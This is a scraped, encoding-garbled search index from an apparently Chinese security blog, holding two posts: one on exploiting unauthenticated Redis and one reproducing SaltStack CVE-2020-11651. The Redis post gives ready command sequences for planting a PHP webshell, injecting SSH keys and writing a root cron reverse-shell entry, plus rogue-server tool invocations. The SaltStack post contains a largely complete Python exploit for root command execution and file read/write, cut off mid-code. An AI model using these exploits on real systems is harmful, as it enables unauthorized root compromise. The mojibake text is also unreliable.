åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼ æœ¬æ–‡ä¸»è¦ä»¥ redis æœªæˆæƒæˆ–å·²çŸ¥ redis å£ä»¤ä¸ºå‰æè¿›è¡Œæ¼æ´åˆ©ç”¨ ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:0:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 å†™å…¥ webshell æ¡ä»¶ï¼š å·²çŸ¥ web ç›®å½•ç»å¯¹è·¯å¾„ æ‹¥æœ‰è¯¥ç›®å½•ä¸‹çš„å¯å†™æƒé™ æŸ¥çœ‹æ‰€æœ‰é”®ï¼Œåˆ›å»ºæ–°é”®ï¼Œé”®å€¼ä¸º webshellï¼Œè¿™é‡Œä»¥å†™å…¥ phpinfo è¿›è¡Œä¸€ä¸ªæ¼”ç¤ºã€‚ å› ä¸ºåˆ›å»ºæ–°é”®èµ‹é”®å€¼ä¼šæŠŠåŸæ¥çš„é”®å€¼è¦†ç›–ï¼Œæ‰€ä»¥éœ€è¦åœ¨èµ‹å€¼çš„æ—¶å€™éœ€è¦æŸ¥çœ‹æ‰€æœ‰çš„é”®ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªæ²¡æœ‰çš„é”®åˆ›å»ºèµ‹å€¼ã€‚ keys * set x \"\\n\\n\u003c?php pnpinfo();?\u003e\\n\" get x æŸ¥çœ‹ redis æ•°æ®åº“é…ç½®ä¿¡æ¯ï¼Œå› ä¸ºæˆ‘ä»¬å†™ Webshell ä¼šä¿®æ”¹ dir å’Œ dbfilenameï¼Œæ‰€ä»¥è¿™é‡ŒæŸ¥çœ‹é…ç½®ä¿¡æ¯ä¸»è¦è®°ä¸‹åŸæ¥çš„å€¼ï¼Œå¥½åœ¨å†™å…¥åä¿®æ”¹å›æ¥ã€‚ config get * è®¾ç½® webshell è¾“å‡ºç›®å½•å’Œæ–‡ä»¶åï¼Œç„¶åå†™å…¥ Webshellã€‚ config set dir /var/www # è®¾ç½®æ–‡ä»¶å†™å…¥ç›®å½• config set dbfilename 1.php # è®¾ç½®å†™å…¥æ–‡ä»¶å save # ä¿å­˜ æœ€åï¼Œå†è¿˜åŸæ•°æ®åº“é…ç½®ã€‚ ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:1:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å†™å…¥ ssh å…¬é’¥ æ¡ä»¶ï¼š å·²çŸ¥å¯åŠ¨æœåŠ¡çš„ç”¨æˆ· æ‹¥æœ‰ .ssh ç›®å½• å…è®¸ä½¿ç”¨åŸºäºå¯†é’¥è®¤è¯çš„æ–¹å¼ç™»é™† ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 ç”Ÿæˆå…¬ç§é’¥å¯¹ ssh-keygen -t rsa # ç”Ÿæˆå…¬é’¥å’Œç§é’¥ ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:1","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 åˆ©ç”¨ redis config å†™æ–‡ä»¶ set x \"\\n\\nå…¬é’¥å†…å®¹\\n\" config set dir /home/user/.ssh config set dbfilename authorized_keys save ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:2","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 åˆ©ç”¨å…¬ç§é’¥å¯¹ç™»å½• ssh -i id_rsa user@ip ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:3","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 å†™å®šæ—¶ä»»åŠ¡åå¼¹ shell æ¡ä»¶ï¼š æ‹¥æœ‰è®¡åˆ’ä»»åŠ¡ç›®å½•å†™æƒé™ ç›®æ ‡å¯åŠ¨è®¡åˆ’æœåŠ¡ keys * æŸ¥çœ‹æ‰€æœ‰é”® set x \"\\n\\nè®¡åˆ’ä»»åŠ¡å†…å®¹\\n\\n\" config get * config set dir /var/spool/cron config set dbfilename root save ä¿å­˜ï¼Œå®Œæˆæ–‡ä»¶å†™å…¥ del x åˆ é™¤åˆ›å»ºçš„xé”® ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4 ä¸»ä»å¤åˆ¶ ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.1 åŠ è½½æ‰©å±•æ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ å…·ä½“çš„åŸç†åœ¨ä¹‹å‰æ¼æ´å¤ç°çš„æ–‡ç« ä¸­å·²ç»è§£é‡Šè¿‡ã€‚ è„šæœ¬åœ°å€ï¼šhttps://github.com/Dliv3/redis-rogue-server ä¸»åŠ¨è¿æ¥æ¨¡å¼ï¼š å‚æ•°è¯´æ˜ --rpasswd å¦‚æœç›®æ ‡ Redis æœåŠ¡å¼€å¯äº†è®¤è¯åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡è¯¥é€‰é¡¹æŒ‡å®šå¯†ç  --rhost ç›®æ ‡ redis æœåŠ¡ IP --rport ç›®æ ‡ redis æœåŠ¡ç«¯å£ï¼Œé»˜è®¤ä¸º 6379 --lhost vps çš„å¤–ç½‘ IP åœ°å€ --lport vps ç›‘æ§çš„ç«¯å£ï¼Œé»˜è®¤ä¸º 21000 python3 redis-rogue-server.py --rhost \u003ctarget address\u003e --rport \u003ctarget port\u003e --lhost \u003cvps address\u003e --lport \u003cvps port\u003e è¢«åŠ¨è¿æ¥æ¨¡å¼ï¼š é€‚ç”¨äºç›®æ ‡RedisæœåŠ¡å¤„äºå†…ç½‘çš„æƒ…å†µ é€šè¿‡ SSRF æ”»å‡» Redis å†…ç½‘ Redis æœªæˆæƒè®¿é—®/å·²çŸ¥ Redis å£ä»¤ï¼ŒRedis éœ€è¦åå‘è¿æ¥ redis rogue server python3 redis-rogue-server.py --server-only ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:1","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.2 ä¸»ä»å¤åˆ¶å†™å…¥çº¯å‡€æ–‡ä»¶ åœ¨ linux ä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ SYNC ä¸»ä»åŒæ­¥ï¼Œæ¥ç›´æ¥å†™å…¥æ— æ‚è´¨çš„æ–‡ä»¶ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š https://github.com/r35tart/RedisWriteFile æ­¤è„šæœ¬æ˜¯é€šè¿‡ Redis ä¸»ä»å†™å‡ºæ— æŸæ–‡ä»¶ï¼Œå¯ç”¨äº Windows å¹³å°ä¸‹å†™å‡ºæ— æŸçš„ EXEã€DLLã€ LNK å’Œ Linux ä¸‹çš„ SO ç­‰äºŒè¿›åˆ¶æ–‡ä»¶ ä¹Ÿå¯ä»¥ç”¨æ— æ‚è´¨è¦†å†™ Linux ä¸­çš„ /etc/shadow python3 RedisWriteFile.py --rhost 172.17.0.2 --rport 6379 --lhost 172.17.0.1 --lport 4444 --rpath \"/var/www\" --rfile \"test.php\" --lfile \"./phpinfo.php\" ä¸Šè¿°æ–¹æ³•ä¸»è¦æ˜¯é’ˆå¯¹ linuxï¼Œå½“ windows ä¸Šæœªå¼€å¯ web æœåŠ¡æ—¶ï¼Œè¯¥å¦‚ä½• getshellï¼Ÿ ä¸‹é¢ä»‹ç»ä¸‹ redis åœ¨ windows ä¸‹çš„å¸¸è§æ‰“æ³•ï¼š ç³»ç»Ÿ DLL åŠ«æŒ ï¼ˆç›®æ ‡é‡å¯æˆ–æ³¨é”€ï¼‰ é’ˆå¯¹ç‰¹å®šè½¯ä»¶çš„ DLL åŠ«æŒï¼ˆç›®æ ‡ä¸€æ¬¡ç‚¹å‡»ï¼‰ è¦†å†™ç›®æ ‡çš„å¿«æ·æ–¹å¼ ï¼ˆç›®æ ‡ä¸€æ¬¡ç‚¹å‡»ï¼‰ è¦†å†™ç‰¹å®šè½¯ä»¶çš„é…ç½®æ–‡ä»¶è¾¾åˆ°ææƒç›®çš„ ï¼ˆç›®æ ‡æ— éœ€ç‚¹å‡»æˆ–ä¸€æ¬¡ç‚¹å‡»ï¼‰ è¦†å†™ sethc.exe ç­‰æ–‡ä»¶ ï¼ˆæ”»å‡»æ–¹ä¸€æ¬¡è§¦å‘ï¼‰ å‚è€ƒï¼šhttp://r3start.net/index.php/2020/05/25/717 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:2","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5 æ¼æ´ä¿®å¤ è®¾ç½®å¯†ç è®¤è¯ å°½é‡ä»¥ä½æƒé™æ¥è¿è¡Œ Redis æœåŠ¡ é™åˆ¶ç™»å½• IP ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:5:0","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰ ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:0:0","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"SaltStack ç®€ä»‹ SaltStack æ˜¯åŸºäº Python å¼€å‘çš„ä¸€å¥— C/S æ¶æ„é…ç½®ç®¡ç†å·¥å…·ï¼Œæ˜¯ä¸€ä¸ªæœåŠ¡å™¨åŸºç¡€æ¶æ„é›†ä¸­åŒ–ç®¡ç†å¹³å°ï¼Œå…·å¤‡é…ç½®ç®¡ç†ã€è¿œç¨‹æ‰§è¡Œã€ç›‘æ§ç­‰åŠŸèƒ½ï¼ŒåŸºäº Python è¯­è¨€å®ç°ï¼Œç»“åˆè½»é‡çº§æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆZeroMQï¼‰ä¸ Python ç¬¬ä¸‰æ–¹æ¨¡å—ï¼ˆPyzmqã€PyCryptoã€Pyjinjia2ã€python-msgpack å’Œ PyYAML ç­‰ï¼‰æ„å»ºã€‚ Salt ç”¨äºç›‘è§†å’Œæ›´æ–°æœåŠ¡å™¨çŠ¶æ€ã€‚æ¯ä¸ªæœåŠ¡å™¨è¿è¡Œä¸€ä¸ªç§°ä¸º minion çš„ä»£ç†ç¨‹åºï¼Œè¯¥ä»£ç†ç¨‹åºè¿æ¥åˆ° master ä¸»æœºï¼Œå³ salt å®‰è£…ç¨‹åºï¼Œè¯¥å®‰è£…ç¨‹åºä» Minions æ”¶é›†çŠ¶æ€æŠ¥å‘Šå¹¶å‘å¸ƒ Minions å¯ä»¥å¯¹å…¶æ‰§è¡Œæ“ä½œçš„æ›´æ–°æ¶ˆæ¯ã€‚é€šå¸¸ï¼Œæ­¤ç±»æ¶ˆæ¯æ˜¯å¯¹æ‰€é€‰æœåŠ¡å™¨é…ç½®çš„æ›´æ–°ï¼Œä½†æ˜¯å®ƒä»¬ä¹Ÿå¯ä»¥ç”¨äºåœ¨å¤šä¸ªï¼ˆç”šè‡³æ‰€æœ‰ï¼‰å—ç®¡ç³»ç»Ÿä¸Šå¹¶è¡Œå¹¶è¡Œè¿è¡ŒåŒä¸€å‘½ä»¤ã€‚ salt ä¸­çš„é»˜è®¤é€šä¿¡åè®®ä¸º ZeroMQã€‚ä¸»æœåŠ¡å™¨å…¬å¼€ä¸¤ä¸ª ZeroMQ å®ä¾‹ï¼Œä¸€ä¸ªç§°ä¸ºè¯·æ±‚æœåŠ¡å™¨ï¼Œå…¶ä¸­ minion å¯ä»¥è¿æ¥åˆ°å…¶ä¸­æŠ¥å‘Šå…¶çŠ¶æ€ï¼ˆæˆ–å‘½ä»¤è¾“å‡ºï¼‰ï¼Œå¦ä¸€ä¸ªç§°ä¸ºå‘å¸ƒæœåŠ¡å™¨ï¼Œå…¶ä¸­ä¸»æœåŠ¡å™¨å¯ä»¥è¿æ¥å’Œè®¢é˜…è¿™äº›æ¶ˆæ¯ã€‚ ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:1:0","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´è¯¦æƒ… ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:0","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“ç‰ˆæœ¬ SaltStack \u003c 2019.2.4 SaltStack \u003c 3000.2 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:1","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´ç»†èŠ‚ èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-11651ï¼‰ ClearFuncs ç±»åœ¨å¤„ç†æˆæƒæ—¶ï¼Œå¹¶æœªé™åˆ¶ _send_pub() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç›´æ¥å¯ä»¥åœ¨å‘å¸ƒé˜Ÿåˆ—æ¶ˆæ¯ï¼Œå‘å¸ƒçš„æ¶ˆæ¯ä¼šé€šè¿‡ root èº«ä»½æƒé™è¿›è¡Œæ‰§è¡Œå‘½ä»¤ã€‚ClearFuncs è¿˜å…¬å¼€äº† _prep_auth_info() æ–¹æ³•ï¼Œé€šè¿‡è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ° root keyï¼Œé€šè¿‡è·å–åˆ°çš„ root key å¯ä»¥åœ¨ä¸»æœåŠ¡ä¸Šè¿œç¨‹è°ƒç”¨å‘½ä»¤ã€‚ ç›®å½•éå†æ¼æ´ï¼ˆCVE-2020-11652ï¼‰ whell æ¨¡å—ä¸­åŒ…å«ç”¨äºåœ¨ç‰¹å®šç›®å½•ä¸‹è¯»å–ã€å†™å…¥æ–‡ä»¶å‘½ä»¤ã€‚å‡½æ•°ä¸­è¾“å…¥çš„ä¿¡æ¯ä¸ç›®å½•è¿›è¡Œæ‹¼æ¥å¯ä»¥ç»•è¿‡ç›®å½•é™åˆ¶ã€‚ åœ¨salt.tokens.localfs ç±»ä¸­çš„ get_token() æ–¹æ³•ï¼ˆç”± ClearFuncs ç±»å¯ä»¥é€šè¿‡æœªæˆæƒè¿›è¡Œè°ƒç”¨ï¼‰æ— æ³•åˆ é™¤è¾“å…¥çš„å‚æ•°ï¼Œå¹¶ä¸”ä½œä¸ºæ–‡ä»¶åç§°ä½¿ç”¨ï¼Œåœ¨è·¯å¾„ä¸­é€šè¿‡æ‹¼æ¥ .. è¿›è¡Œè¯»å–ç›®æ ‡ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ã€‚å”¯ä¸€çš„é™åˆ¶æ˜¯æ–‡ä»¶å¿…é¡»é€šè¿‡ salt.payload.Serial.loads() è¿›è¡Œååºåˆ—åŒ–ã€‚ ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:2","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:0","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"nmap æ¢æµ‹ç«¯å£ nmap -sV -p 4504,4506 IP ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:1","tags":["SaltStack","æ¼æ´å¤ç°"],"title":"SaltStack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2020-11651ï¼‰","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["æ¼æ´å¤ç°"],"content":"exp #!/usr/bin/env python3 import argparse import datetime import os import pip import sys import warnings def install(package): if hasattr(pip, \"main\"): pip.main([\"install\", package]) else: pip._internal.main([\"install\", package]) try: import salt import salt.version import salt.transport.client import salt.exceptions except: install(\"distro\") install(\"salt\") def ping(channel): message = { \"cmd\":\"ping\" } try: response = channel.send(message, timeout=5) if response: return True except salt.exceptions.SaltReqTimeoutError: pass return False def get_rootkey(channel): message = { \"cmd\":\"_prep_auth_info\" } try: response = channel.send(message, timeout=5) for i in response: if isinstance(i,dict) and len(i) == 1: rootkey = list(i.values())[0] return rootkey except: pass return False def minion(channel, command): message = { \"cmd\": \"_send_pub\", \"fun\": \"cmd.run\", \"arg\": [\"/bin/sh -c \\\"{command}\\\"\"], \"tgt\": \"*\", \"ret\": \"\", \"tgt_type\": \"glob\", \"user\": \"root\", \"jid\": \"{0:%Y%m%d%H%M%S%f}\".format(datetime.datetime.utcnow()), \"_stamp\": \"{0:%Y-%m-%dT%H:%M:%S.%f}\".format(datetime.datetime.utcnow()) } try: response = channel.send(message, timeout=5) if response == None: return True except: pass return False def master(channel, key, command): message = { \"key\": key, \"cmd\": \"runner\", \"fun\": \"salt.cmd\", \"kwarg\":{ \"fun\": \"cmd.exec_code\", \"lang\": \"python3\", \"code\": f\"import subprocess;subprocess.call(\\\"{command}\\\",shell=True)\" }, \"user\": \"root\", \"jid\": \"{0:%Y%m%d%H%M%S%f}\".format(datetime.datetime.utcnow()), \"_stamp\": \"{0:%Y-%m-%dT%H:%M:%S.%f}\".format(datetime.datetime.utcnow()) } try: response = channel.send(message, timeout=5) log(\"[ ] Response: \" + str(response)) except: return False def download(channel, key, src, dest): message = { \"key\": key, \"cmd\": \"wheel\", \"fun\": \"file_roots.read\", \"path\": path, \"saltenv\": \"base\", } try: response = channel.send(message, timeout=5) data = response[\"data\"][\"return\"][0][path] with open(dest, \"wb\") as o: o.write(data) return True except: return False def upload(channel, key, src, dest): try: with open(src, \"rb\") as s: data = s.read() except Exception as e: print(f\"[ ] Failed to read {src}: {e}\") return False message = { \"key\": key, \"cmd\": \"wheel\", \"fun\": \"file_roots.write\", \"saltenv\": \"base\", \"data\": data, \"path\": 